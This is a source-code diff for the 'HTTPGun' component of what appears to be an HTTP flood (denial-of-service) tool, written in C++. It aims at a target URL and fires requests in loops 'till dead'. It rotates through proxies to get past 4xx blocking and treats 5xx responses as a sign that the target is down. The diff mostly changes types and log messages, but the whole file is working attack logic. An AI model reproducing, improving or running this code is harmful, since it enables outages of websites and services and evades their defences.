@@ -3,6 +3,7 @@
 #include "http_gun.h"
 
 #include "api_interface.h"
+#include "target.hpp"
 #include "utils.h"
 #include "config.h"
 #include "globals.h"
@@ -14,6 +15,7 @@ std::optional<Proxy> HTTPGun::ChoseProxy(const std::vector<Proxy> &proxies) noex
 	CURLLoader prober;
 	Headers headers{CURLLoader::BASE_HEADERS};
 
+	SPDLOG_INFO("Probing proxies with {}", ProxyConfig::PROXY_PROBING);
 	prober.SetTarget(ProxyConfig::PROXY_PROBING);
 	for(auto proxy : proxies)
 	{
@@ -27,11 +29,11 @@ std::optional<Proxy> HTTPGun::ChoseProxy(const std::vector<Proxy> &proxies) noex
 			{
 				return proxy;
 			}
-			SPDLOG_ERROR("Proxy: {}@{} failed with code: {}", proxy.first, proxy.second, *respCode);
+			SPDLOG_INFO("Proxy: {}@{} failed with code: {}", proxy.first, proxy.second, *respCode);
 		}
 		else
 		{
-		SPDLOG_ERROR("Proxy: {}@{} failed", proxy.first, proxy.second);
+			SPDLOG_INFO("Proxy: {}@{} failed", proxy.first, proxy.second);
 		}
 	}
 
@@ -63,13 +65,14 @@ bool HTTPGun::SetValidProxy() noexcept
 		}
 		if(proxyTries == ProxyConfig::PROXY_TRIES)
 		{
+			SPDLOG_WARN("Max proxy fetch tries reached, aborting");
 			break;
 		}
 	}
 	return false;
 }
 
-std::optional<Target> HTTPGun::Aim(const CURI &uriToAttack) noexcept
+std::optional<CURI> HTTPGun::Aim(const CURI &uriToAttack) noexcept
 {
 	CURLLoader prober;
 	Headers headers{CURLLoader::BASE_HEADERS};
@@ -93,10 +96,10 @@ std::optional<Target> HTTPGun::Aim(const CURI &uriToAttack) noexcept
 				if(receivedHeaders.find(locationString) !=
 					std::end(receivedHeaders))
 				{
-					return Target{receivedHeaders[locationString], 0};
+					return CURI{receivedHeaders[locationString]};
 				}
 			}
-			return Target{uriToAttack.GetFullURI(), 0};
+			return CURI{uriToAttack.GetFullURI()};
 		}
 		else if(*targetRespCode >= 500)
 		{
@@ -119,38 +122,35 @@ std::optional<Target> HTTPGun::Aim(const CURI &uriToAttack) noexcept
 		*targetRespCode >= 200 && *targetRespCode < 400)
 	{
 		std::cout << "Firing with proxy" << std::endl;
-		return Target{uriToAttack.GetFullURI(), 0};
+		return CURI{uriToAttack.GetFullURI()};
 	}
 
 	return {};
 }
 
-void HTTPGun::FireTillDead(const Target &targetToKill) noexcept
+void HTTPGun::FireTillDead(const CURI &targetToKill) noexcept
 {
-	if(!m_currentProxy)
+	SPDLOG_INFO("Attacking {} without proxy", targetToKill);
+	if(AttackWithNoProxy(targetToKill))
 	{
-		SPDLOG_INFO("Attacking {} without proxy", targetToKill.address);
-		if(AttackWithNoProxy(targetToKill))
-		{
-			return;
-		}
+		return;
 	}
 
-	if(!m_currentTask.ShouldStop() && m_currentProxy)
+	if(!m_currentTask.ShouldStop())
 	{
-		SPDLOG_INFO("Attacking {} with proxy", targetToKill.address);
+		SPDLOG_INFO("Attacking {} with proxy", targetToKill);
 		AttackWithProxy(targetToKill);
 	}
 }
 
-bool HTTPGun::AttackWithNoProxy(const Target &targetToKill) noexcept
+bool HTTPGun::AttackWithNoProxy(const CURI &targetToKill) noexcept
 {
 	Headers headers{CURLLoader::BASE_HEADERS};
 	CURLLoader wrapper;
 
 	size_t errorsCount{0};
 
-	wrapper.SetTarget(targetToKill.address);
+	wrapper.SetTarget(targetToKill.GetFullURI());
 
 	while(!m_currentTask.ShouldStop())
 	{
@@ -159,46 +159,48 @@ bool HTTPGun::AttackWithNoProxy(const Target &targetToKill) noexcept
 
 		if(const auto respCode{wrapper.Ping(AttackerConfig::FIRE_TIMEOUT_SECONDS)})
 		{
+			if(m_currentTask.ShouldStop())
+			{
+				break;
+			}
 			if(!respCode && ++errorsCount > AttackerConfig::MAX_ATTACK_ERRORS_COUNT)
 			{
+				SPDLOG_WARN("Too many errors emited on no proxy attack, retrying");
 				return true;
 			}
 			else if(*respCode >= 400 && *respCode < 500)
 			{
-				SPDLOG_WARN("Max errors count reached, retrying");
-				return true;
+				SPDLOG_WARN("Target {} is blocking non proxy requests, leaving", targetToKill);
+				break;
 			}
 			else if(*respCode >= 500)
 			{
-				SPDLOG_INFO("Target: {} is probably down, looking for others", targetToKill.address);
-				return false;
+				SPDLOG_INFO("Target: {} is probably down, looking for others", targetToKill);
+				return true;
 			}
 		}
 	}
-	SPDLOG_INFO("Attack without proxy finished");
 
 	return false;
 }
 
-void HTTPGun::AttackWithProxy(const Target &targetToKill) noexcept
+void HTTPGun::AttackWithProxy(const CURI &targetToKill) noexcept
 {
 	CURLLoader wrapper;
 	Informator apiLoader;
 	Headers headers{CURLLoader::BASE_HEADERS};
 
-	wrapper.SetTarget(targetToKill.address);
+	wrapper.SetTarget(targetToKill.GetFullURI());
 
 	while(!m_currentTask.ShouldStop())
 	{
 		// Setting proxies
-		SPDLOG_INFO("Setting proxy");
-		if(!m_currentProxy && !SetValidProxy())
+		if(!SetValidProxy())
 		{
 			return;
 		}
 
 		// Attacking
-		SPDLOG_INFO("Attacking");
 		size_t errorsCount{0};
 		for(size_t currentTry = 0; 
 			currentTry < ProxyConfig::MAX_PROXY_ATTACKS; currentTry++)
@@ -207,22 +209,26 @@ void HTTPGun::AttackWithProxy(const Target &targetToKill) noexcept
 			wrapper.SetHeaders(headers);
 
 			const auto respCode{wrapper.Ping(AttackerConfig::FIRE_TIMEOUT_SECONDS)};
-			if(m_currentTask.ShouldStop() || !respCode && ++errorsCount > AttackerConfig::MAX_ATTACK_ERRORS_COUNT)
+			if(m_currentTask.ShouldStop())
 			{
-				break;
+				return;
+			}
+			else if(!respCode && ++errorsCount > AttackerConfig::MAX_ATTACK_ERRORS_COUNT)
+			{
+				SPDLOG_INFO("Too many errors emited on proxy attack, trying other");
+				return;
 			}
 			else if(*respCode >= 400 && *respCode < 500)
 			{
-				SPDLOG_WARN("Target {} responded with not allowed code", targetToKill.address);
+				SPDLOG_INFO("Target {} is blocking current proxy, trying other", targetToKill);
 				break;
 			}
 			else if(*respCode >= 500)
 			{
-				SPDLOG_INFO("Target: {} is down, looking for others", targetToKill.address);
+				SPDLOG_INFO("Target: {} is down, looking for others", targetToKill);
 				return;
 			}
 		}
 		SPDLOG_WARN("Current proxy exhausted, looking for other");
-		m_currentProxy = std::nullopt;
 	}
 }
